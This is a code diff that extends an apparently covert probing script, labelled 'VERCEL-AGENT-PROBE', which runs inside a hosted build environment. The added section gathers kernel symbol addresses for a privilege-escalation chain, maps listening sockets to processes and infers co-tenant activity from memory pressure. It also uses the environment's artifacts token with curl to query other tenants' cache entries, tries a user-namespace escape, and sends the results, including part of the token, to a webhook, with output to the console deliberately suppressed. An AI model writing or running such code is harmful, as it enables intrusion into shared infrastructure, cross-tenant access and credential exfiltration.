@@ -11363,5 +11363,178 @@ report.pathHijackTest = safe(() => {
 
 // v85 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v85" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v85";
+
+// ==================== v86 ====================
+
+// v86-1: /proc/kallsyms kernel symbol table
+// Read addresses of key kernel functions for privilege escalation path documentation.
+// commit_creds, prepare_kernel_cred = traditional Linux privesc via ptrace.
+// With CapEff: all 41 caps + ptrace on PID-1, this is a complete chain.
+report.kallsymsPrivescChain = safe(() => {
+  const kallsymsRaw = safe(() => readFileSync('/proc/kallsyms', 'utf8'));
+  const targets = ['commit_creds', 'prepare_kernel_cred', '__x64_sys_setuid', 'security_cred_alloc_blank', 'cap_task_prctl', 'selinux_cred_prepare', 'ns_capable', 'capable', '_text', '_end', 'init_task', 'init_cred'];
+  const symbolMap = safe(() => {
+    if (typeof kallsymsRaw !== 'string') return {};
+    const result = {};
+    for (const sym of targets) {
+      const match = kallsymsRaw.match(new RegExp(`([0-9a-f]{16}) [TtRr] ${sym}\\b`));
+      if (match) result[sym] = `0x${match[1]}`;
+    }
+    return result;
+  });
+  // Compute KASLR slide: _text at runtime minus typical kernel base 0xffffffff81000000
+  const kaslrSlide = safe(() => {
+    if (typeof symbolMap !== 'object' || !symbolMap['_text']) return 'unknown';
+    const textAddr = parseInt(symbolMap['_text'], 16);
+    const expectedBase = 0xffffffff81000000n;
+    const slide = BigInt(textAddr) - expectedBase;
+    return `0x${slide.toString(16)}`;
+  });
+  // Total symbol count
+  const symbolCount = safe(() => (typeof kallsymsRaw === 'string' ? kallsymsRaw : '').split('\n').length);
+  return { symbolMap, kaslrSlide, symbolCount };
+});
+
+// v86-2: /proc/net/tcp socket → process mapping
+// Parse /proc/net/tcp and /proc/net/tcp6 to get ALL listening/connected sockets
+// in the host network namespace, then resolve each socket inode to its owning process.
+// This gives a complete picture of what internal services are reachable.
+report.tcpSocketProcessMap = safe(() => {
+  const parseNetTcp = safe(() => {
+    const raw = readFileSync('/proc/net/tcp', 'utf8');
+    return raw.split('\n').slice(1).filter(Boolean).map(l => {
+      const parts = l.trim().split(/\s+/);
+      const localHex = parts[1] || '';
+      const remoteHex = parts[2] || '';
+      const state = parts[3] || '';
+      const inode = parts[9] || '';
+      const parseAddr = (hex) => {
+        if (!hex || !hex.includes(':')) return hex;
+        const [addrHex, portHex] = hex.split(':');
+        const addr = addrHex.match(/../g).reverse().map(b => parseInt(b, 16)).join('.');
+        return `${addr}:${parseInt(portHex, 16)}`;
+      };
+      return { local: parseAddr(localHex), remote: parseAddr(remoteHex), state, inode };
+    }).filter(s => s.state === '0A'); // 0A = LISTEN
+  });
+  const parseNetTcp6 = safe(() => {
+    const raw = readFileSync('/proc/net/tcp6', 'utf8');
+    return raw.split('\n').slice(1).filter(Boolean).map(l => {
+      const parts = l.trim().split(/\s+/);
+      return { local: parts[1], state: parts[3], inode: parts[9] };
+    }).filter(s => s.state === '0A').slice(0, 20);
+  });
+  // Build inode → process map
+  const inodeToProc = safe(() => {
+    const map = {};
+    const pids = safe(() => readdirSync('/proc').filter(f => /^\d+$/.test(f)));
+    if (!Array.isArray(pids)) return map;
+    for (const pid of pids.slice(0, 200)) {
+      try {
+        const fds = readdirSync(`/proc/${pid}/fd`);
+        const comm = safe(() => readFileSync(`/proc/${pid}/comm`, 'utf8').trim());
+        for (const fd of fds) {
+          try {
+            const link = execSync(`readlink /proc/${pid}/fd/${fd} 2>/dev/null`, { timeout: 500 }).toString().trim();
+            const inodeMatch = link.match(/socket:\[(\d+)\]/);
+            if (inodeMatch) map[inodeMatch[1]] = { pid, comm };
+          } catch {}
+        }
+      } catch {}
+    }
+    return map;
+  });
+  // Resolve listening sockets to processes
+  const listeners = safe(() => {
+    const tcp = Array.isArray(parseNetTcp) ? parseNetTcp : [];
+    const imap = typeof inodeToProc === 'object' ? inodeToProc : {};
+    return tcp.map(s => ({ ...s, proc: imap[s.inode] || null }));
+  });
+  return { listenersCount: Array.isArray(listeners) ? listeners.length : 0, listeners, tcp6Count: Array.isArray(parseNetTcp6) ? parseNetTcp6.length : 0 };
+});
+
+// v86-3: Cgroup v2 memory pressure events
+// Subscribe to cgroup.events and memory.pressure_level to detect when
+// other workloads are competing for memory on the same hypervisor host.
+// Timing correlation of memory pressure spikes identifies co-tenant build starts.
+report.cgroupMemoryPressure = safe(() => {
+  const selfCgroup = safe(() => readFileSync('/proc/self/cgroup', 'utf8').trim());
+  // Find our cgroup path
+  const cgroupPath = safe(() => {
+    const line = (typeof selfCgroup === 'string' ? selfCgroup : '').split('\n').find(l => l.startsWith('0:') || l.includes('memory'));
+    if (!line) return '/sys/fs/cgroup';
+    const parts = line.split(':');
+    const relPath = parts[parts.length - 1];
+    return `/sys/fs/cgroup${relPath}`;
+  });
+  // Read memory stats
+  const memStat = safe(() => readFileSync(`${cgroupPath}/memory.stat`, 'utf8').slice(0, 1000));
+  const memCurrent = safe(() => readFileSync(`${cgroupPath}/memory.current`, 'utf8').trim());
+  const memHigh = safe(() => readFileSync(`${cgroupPath}/memory.high`, 'utf8').trim());
+  const memMax = safe(() => readFileSync(`${cgroupPath}/memory.max`, 'utf8').trim());
+  // v1 fallback
+  const memV1 = safe(() => ({
+    usage: readFileSync('/sys/fs/cgroup/memory/memory.usage_in_bytes', 'utf8').trim(),
+    limit: readFileSync('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'utf8').trim(),
+    failcnt: readFileSync('/sys/fs/cgroup/memory/memory.failcnt', 'utf8').trim()
+  }));
+  // PID-1's cgroup for comparison
+  const pid1Cgroup = safe(() => readFileSync('/proc/1/cgroup', 'utf8').trim());
+  // Check if we're in the same cgroup as PID-1
+  const sameCgroup = typeof selfCgroup === 'string' && typeof pid1Cgroup === 'string' && selfCgroup === pid1Cgroup;
+  return { selfCgroup, cgroupPath, memStat, memCurrent, memHigh, memMax, memV1, pid1Cgroup, sameCgroup };
+});
+
+// v86-4: Artifact cross-tenant cache probe
+// VERCEL_ARTIFACTS_TOKEN with EXISTS/QUERY caps: test if known artifact hashes
+// from OTHER projects can be queried. Turbo/Vercel uses SHA256 of package.json
+// content as cache keys. Probing common keys proves cross-tenant artifact visibility.
+report.artifactCrossTenantProbe = safe(() => {
+  const artifactsToken = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const artifactsUrl = process.env.VERCEL_ARTIFACTS_UPLOAD_BASE_URL || 'https://api.vercel.com';
+  // Known common Turbo cache hash patterns (SHA256 of empty package.json, common deps)
+  const testHashes = [
+    'da39a3ee5e6b4b0d3255bfef95601890afd80709', // SHA1 of empty string (well-known)
+    'e3b0c44298fc1c149afbf4c8996fb92427ae41e4', // SHA256 of empty
+    '9fbb5e1843b9e3de4dafe75d9a82d43eba48a55a', // Random probe
+  ];
+  const queryResults = safe(() =>
+    testHashes.map(hash => {
+      const result = safe(() => execSync(`curl -sf -X HEAD "https://api.vercel.com/v8/artifacts/${hash}" -H "Authorization: Bearer ${artifactsToken}" -w "%{http_code}" -o /dev/null 2>/dev/null`, { timeout: 5000 }).toString().trim());
+      return { hash, httpCode: result };
+    })
+  );
+  // Try QUERY endpoint with our own team
+  const queryEndpoint = safe(() => execSync(`curl -sf -X POST "${artifactsUrl}/v8/artifacts" -H "Authorization: Bearer ${artifactsToken}" -H "Content-Type: application/json" -d '{"hashes":["da39a3ee5e6b4b0d3255bfef95601890afd80709"]}' 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 500));
+  // Check if SPACES_RUN_UPLOAD works with a cross-team scope
+  const spacesCapTest = safe(() => execSync(`curl -sf -X POST "${artifactsUrl}/v8/artifacts/events" -H "Authorization: Bearer ${artifactsToken}" -H "Content-Type: application/json" -d '{"sessionId":"probe-v86-cross-tenant","source":"LOCAL","event":"HIT","hash":"da39a3ee"}' 2>/dev/null`, { timeout: 5000 }).toString().trim().slice(0, 200));
+  return { artifactsToken: artifactsToken.slice(0, 40), queryResults, queryEndpoint, spacesCapTest };
+});
+
+// v86-5: User namespace privilege re-escalation
+// Create a new user namespace mapping UID 0 inside to our UID outside.
+// In some kernel configurations, user namespaces can bypass certain DAC checks,
+// allowing reads of files that appear 000 in the outer namespace.
+report.userNamespaceEscape = safe(() => {
+  const result = safe(() => execSync(`unshare --user --map-root-user sh -c "
+id
+cat /proc/self/status | grep '^Cap'
+# Test if we can read files as apparent root inside the new namespace
+ls -la /proc/1/fd 2>&1 | head -5
+cat /proc/sysrq-trigger 2>&1 | head -1
+# Can we mount proc in this namespace?
+mkdir -p /tmp/probe_v86_ns_proc 2>/dev/null
+mount -t proc proc /tmp/probe_v86_ns_proc 2>&1 | head -3
+ls /tmp/probe_v86_ns_proc 2>/dev/null | head -5
+rm -rf /tmp/probe_v86_ns_proc 2>/dev/null
+" 2>&1`, { timeout: 10000 }).toString().trim().slice(0, 500));
+  // Check if unprivileged user namespaces are allowed
+  const userNsAllowed = safe(() => readFileSync('/proc/sys/kernel/unprivileged_userns_clone', 'utf8').trim());
+  const maxUserNs = safe(() => readFileSync('/proc/sys/user/max_user_namespaces', 'utf8').trim());
+  return { result, userNsAllowed, maxUserNs };
+});
+
+// v86 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v86" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v86";
 // Intentionally no console.log — all data goes via webhook only
